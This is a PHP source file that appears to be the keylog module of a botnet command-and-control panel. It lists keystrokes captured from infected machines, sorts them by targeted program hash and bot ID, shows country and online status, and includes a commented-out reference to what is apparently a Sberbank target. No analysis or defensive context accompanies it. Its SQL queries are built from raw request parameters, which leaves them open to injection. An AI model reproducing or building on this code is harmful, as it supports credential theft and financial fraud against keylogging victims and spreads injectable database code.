<?php

get_function('html_pages');
get_function('ts2str');
get_function('kldecode');

include_once('modules/bots/country_code.php');
$smarty->assign('country', $country_code);
/*
function get_stat($bot){
	if(file_exists('cache/kls/' . $bot->hash . '_' . $bot->prefix . $bot->uid)){
		return file_get_contents('cache/kls/' . $bot->hash . '_' . $bot->prefix . $bot->uid);
	}else{
		return 0;
	}
}
*/
if(empty($Cur['y'])) $Cur['y'] = 0;

if(!empty($Cur['id'])){
	$prog = $mysqli->query('SELECT * FROM bf_keylog WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
	
	if($prog->id == $Cur['id']){
		if(!empty($_SESSION['user']->config['klimit'])){
			$_SESSION['user']->config['klimit'] = implode('|', json_decode(base64_decode($_SESSION['user']->config['klimit']), true));
			if(!preg_match('~^('.$_SESSION['user']->config['klimit'].')$~is', $prog->hash)){
				header('Location: /keylog/index.html?ajax=' . $Cur['ajax']);
				exit;
			}
		}
		
		if($Cur['ajax'] == 1){
			if($Cur['y'] == 1){
				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $lang['trash'] . ' - ' . $prog->name.'\';</script>');
			}else{				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $prog->name.'\';</script>');
			}
		}else{
			if($Cur['y'] == 1){
				$smarty->assign('title', $lang['keylog'] . ' - ' . $lang['trash'] . ' - ' . $prog->name);
			}else{
				$smarty->assign('title', $lang['keylog'] . ' - ' . $prog->name);
			}
		}

		$smarty->assign('prog', $prog);
		
		if(!empty($_SESSION['user']->config['prefix'])){
			$list = $mysqli->query('SELECT a.id,a.prefix,a.uid,a.hash,a.shash,a.post_date,COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.uniq = a.hash) AND (b.type = \'9\') LIMIT 1) comment, (SELECT c.country FROM bf_bots c WHERE (c.prefix = a.prefix) AND (c.uid = a.uid) LIMIT 1) country FROM bf_keylog_data a WHERE (a.prefix = \''.$_SESSION['user']->config['prefix'].'\') AND (a.hash = \''.$prog->hash.'\') AND (a.trash = \''.$Cur['y'].'\') GROUP by concat(a.prefix,a.uid) ORDER by a.post_date DESC LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['keylogp'] : $Cur['page']*$_SESSION['user']->config['cp']['keylogp'] . ',' . $_SESSION['user']->config['cp']['keylogp']), null, null, false);
			$counts = $mysqli->query_name('SELECT  COUNT(DISTINCT(concat(prefix,uid))) count FROM bf_keylog_data WHERE (prefix = \''.$_SESSION['user']->config['prefix'].'\') AND (hash = \''.$prog->hash.'\') AND (trash = \''.$Cur['y'].'\')', null, 'count', 0, true);
		}else{
			$list = $mysqli->query('SELECT a.id,a.prefix,a.uid,a.hash,a.shash,a.post_date,COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.uniq = a.hash) AND (b.type = \'9\') LIMIT 1) comment, (SELECT c.country FROM bf_bots c WHERE (c.prefix = a.prefix) AND (c.uid = a.uid) LIMIT 1) country FROM bf_keylog_data a WHERE (a.hash = \''.$prog->hash.'\') AND (a.trash = \''.$Cur['y'].'\') GROUP by concat(a.prefix,a.uid) ORDER by a.post_date DESC LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['keylogp'] : $Cur['page']*$_SESSION['user']->config['cp']['keylogp'] . ',' . $_SESSION['user']->config['cp']['keylogp']), null, null, false);
			$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(concat(prefix,uid))) count FROM bf_keylog_data WHERE (hash = \''.$prog->hash.'\') AND (trash = \''.$Cur['y'].'\')', null, 'count', 0, true);
		}
		
		$smarty->assign('list', $list);
		$smarty->assign('counts', $counts);
		
		$smarty->assign('pages', html_pages('/keylog/hash-'.$Cur['id'].'.html?', $counts, $_SESSION['user']->config['cp']['keylogp'], 1, 'bots_list', 'this.href'));
		
		if(!file_exists('cache/online_bot.json') || (time() - filemtime('cache/online_bot.json')) >= ($config['live']*60)){
			$online = array();
			function online_check($row){
				global $online;
				$online[$row->prefix][$row->uid] = 1;
			}
			
			$mysqli->query('SELECT prefix, uid FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\')', null, 'online_check');
			file_put_contents('cache/online_bot.json', json_encode($online));
		}else{
			$online = json_decode(file_get_contents('cache/online_bot.json'), true);
		}
		
		$smarty->assign("online", $online);
		/*
		if($prog->hash == '0x321ECF12'){
			$Cur['go'] = 'hash_sber';
		}
		*/
	}else{
		header('Location: /keylog/index.html?ajax=' . $Cur['ajax']);
		exit;
	}
}elseif(!empty($Cur['str']) && !empty($Cur['x'])){
	
	if(!empty($_SESSION['user']->config['klimit'])){
		$_SESSION['user']->config['klimit'] = implode('|', json_decode(base64_decode($_SESSION['user']->config['klimit']), true));
		if(!preg_match('~^('.$_SESSION['user']->config['klimit'].')$~is', $Cur['str'])){
			header('Location: /keylog/index.html?ajax=' . $Cur['ajax']);
			exit;
		}
	}
	
	$prog = $mysqli->query('SELECT * FROM bf_keylog WHERE (hash = \''.$Cur['str'].'\') LIMIT 1');
	
	if($prog->hash == $Cur['str']){
		$smarty->assign('prog', $prog);
		$matches = explode('0', $Cur['x'], 2);
		if(!empty($matches[0]) && !empty($matches[1])){
			$prefix = $matches[0];
			$uid = '0' . $matches[1];
		}
		
		if(!empty($_SESSION['user']->config['prefix'])){
			if($_SESSION['user']->config['prefix'] != $prefix){
				header('Location: /keylog/hash-'.$prog->id.'.html?ajax=' . $Cur['ajax']);
				exit;
			}
		}

		if($Cur['ajax'] == 1){
			if($Cur['y'] == 1){
				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $lang['trash'] . ' - ' . $prog->name . ' - ' . $Cur['x']  . '\';</script>');
			}else{
				print('<script type="text/javascript" language="javascript">document.title = \''.$lang['keylog'] . ' - ' . $prog->name . ' - ' . $Cur['x']  . '\';</script>');
			}
		}else{
			if($Cur['y'] == 1){
				$smarty->assign('title', $lang['keylog'] . ' - ' . $lang['trash'] . ' - ' . $prog->name . ' - ' . $Cur['x']);
			}else{
				$smarty->assign('title', $lang['keylog'] . ' - ' . $prog->name . ' - ' . $Cur['x']);
			}
		}
		
		$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') LIMIT 1');
		$smarty->assign('bot', $bot);
		
		$list = $mysqli->query('SELECT id,prefix,uid,hash,shash,post_date,data FROM bf_keylog_data WHERE (hash = \''.$prog->hash.'\') AND (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (trash = \''.$Cur['y'].'\') ORDER by post_date ASC LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['keylogp'] : $Cur['page']*$_SESSION['user']->config['cp']['keylogp'] . ',' . $_SESSION['user']->config['cp']['keylogp']), null, null, false);
		$smarty->assign('list', $list);
		
		$comment = $mysqli->query('SELECT b.comment FROM bf_comments b WHERE (b.prefix = \''.$prefix.'\') AND (b.uid = \''.$uid.'\') AND (b.uniq = MD5(concat(\''.$prog->hash.'\',\''.$list[0]->shash.'\'))) AND (b.type = \'9\') LIMIT 1');
		$smarty->assign('comment', $comment->comment);
		$smarty->assign('item', true);
		/*
		if($prog->hash == '0x321ECF12'){
			$Cur['go'] = 'hash_sber';
		}
		*/
	}else{
		header('Location: /keylog/index.html?ajax=' . $Cur['ajax']);
		exit;
	}
}

?>